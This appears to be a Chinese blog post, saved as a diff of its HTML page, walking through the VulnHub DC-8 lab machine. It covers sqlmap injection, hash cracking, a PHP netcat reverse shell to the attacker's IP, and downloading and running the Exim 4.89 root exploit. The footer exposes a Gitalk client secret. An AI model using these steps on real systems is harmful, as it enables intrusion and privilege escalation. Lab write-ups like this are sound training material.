@@ -1,0 +1,313 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>vulnhub DC-8 靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="vulnhub DC-8 靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="DC - 8
+前言：
+攻击机: kali            192.168.56.132
+靶机:     DC 8          192.168.56.149
+过关条件 ：得到root权限后得到falg。
+打到第八个了 准备把九个都..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              vulnhub DC-8 靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-23
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h4 id="dc-8">DC - 8</h4>
+<h5 id="前言">前言：</h5>
+<p>攻击机: kali            192.168.56.132</p>
+<p>靶机:     DC 8          192.168.56.149</p>
+<p>过关条件 ：得到root权限后得到falg。</p>
+<p>打到第八个了 准备把九个都打一下 然后就总结下。再去好好打打红日那个靶场 第一个红日都打了好久了。。。。。</p>
+<h5 id="内网信息探测">内网信息探测</h5>
+<pre><code class="language-shell">还是nmap arp-scan 一把梭吧。
+确定了靶机IP和开放端口。
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192016985.png" alt="image-20230323192016985" loading="lazy"></figure>
+<h5 id="sql-注入">SQL 注入</h5>
+<p>开放了80端口直接访问 进去后随便点 发现可能存在sql注入</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192148866.png" alt="image-20230323192148866" loading="lazy"></figure>
+<p>sqlmap直接一把梭。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192342983.png" alt="image-20230323192342983" loading="lazy"></figure>
+<p>得到账号密码 但是密码加密的 将密码复制下来写入文本文件 然后使用john暴破</p>
+<pre><code class="language-shell">john --wordlist=/usr/share/john/password.lst --rules dc8.txt
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192448841.png" alt="image-20230323192448841" loading="lazy"></figure>
+<h5 id="get-shell">Get shell</h5>
+<p>不知道登录路径 使用dirsearch 扫一下</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192616695.png" alt="image-20230323192616695" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192636386.png" alt="image-20230323192636386" loading="lazy"></figure>
+<p>访问路径 使用john账号密码可以登录</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192733188.png" alt="image-20230323192733188" loading="lazy"></figure>
+<p>到这个路径下写入反弹shell</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192816460.png" alt="image-20230323192816460" loading="lazy"></figure>
+<pre><code class="language-php">&lt;p&gt;demon&lt;/p&gt;
+
+&lt;?php
+
+system(&quot;nc -e /bin/sh 192.168.56.132 4444&quot;);
+
+?&gt;
+</code></pre>
+<p>需要使用php加载，保存后去 kali监听端口。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323192937576.png" alt="image-20230323192937576" loading="lazy"></figure>
+<p>然后到主界面提交数据</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323193028865.png" alt="image-20230323193028865" loading="lazy"></figure>
+<p>成功反射到kali的端口 然后需要用python得到完整的shell环境。</p>
+<pre><code class="language-shell">python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>得到完整的shell环境<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323193158885.png" alt="image-20230323193158885" loading="lazy"></p>
+<h5 id="权限提升">权限提升</h5>
+<pre><code class="language-shell">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323193314251.png" alt="image-20230323193314251" loading="lazy"></figure>
+<p>看到exim 4可能存在提权漏洞。</p>
+<pre><code class="language-shell">exim4 --version
+//版本为 4.89 满足条件
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323193421415.png" alt="image-20230323193421415" loading="lazy"></figure>
+<pre><code class="language-shell">searchsploit exim 4    //漏洞库查找提权文件。
+</code></pre>
+<p>查看对应脚本</p>
+<pre><code class="language-shell">cat /usr/share/exploitdb/exploits/linux/local/46996.sh
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323193554146.png" alt="image-20230323193554146" loading="lazy"></figure>
+<p>copy 到桌面</p>
+<pre><code class="language-shell">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /root/桌面/DC8shell.sh
+</code></pre>
+<p>修改文件</p>
+<pre><code class="language-shell">vim DC8shell.sh
+
+到这里按键盘esc
+然后按键盘shift+:
+输入set ff=unix
+</code></pre>
+<p>python开启http服务</p>
+<pre><code class="language-shell">python -m http.server 8899
+</code></pre>
+<p>访问kali本机的IP:8899</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323193819540.png" alt="image-20230323193819540" loading="lazy"></figure>
+<p>复制DC 8的链接</p>
+<p>到 tmp目录下使用wget下载脚本</p>
+<pre><code class="language-shell">cd /tmp
+wget http://192.168.56.132:8899/DC8shell.sh
+
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323194013813.png" alt="image-20230323194013813" loading="lazy"></figure>
+<pre><code class="language-shell">chmod 777 DC8shell.sh
+./DC8shell.sh -m netcat
+</code></pre>
+<p>成功提权</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323194124656.png" alt="image-20230323194124656" loading="lazy"></figure>
+<p>然后到 /root目录下得到 flag</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230323194155924.png" alt="image-20230323194155924" loading="lazy"></figure>
+<h5 id="总结">总结</h5>
+<p>信息收集-&gt;sql注入-&gt;得到john账号密码-&gt;找写入点getshell-&gt;权限提升 使用的exim 4提权。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#dc-8">DC - 8</a>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言：</a></li>
+<li><a href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B">内网信息探测</a></li>
+<li><a href="#sql-%E6%B3%A8%E5%85%A5">SQL 注入</a></li>
+<li><a href="#get-shell">Get shell</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/nei-wang-gao-jing-xue-xi/">
+              <h3 class="post-title">
+                内网告警学习
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
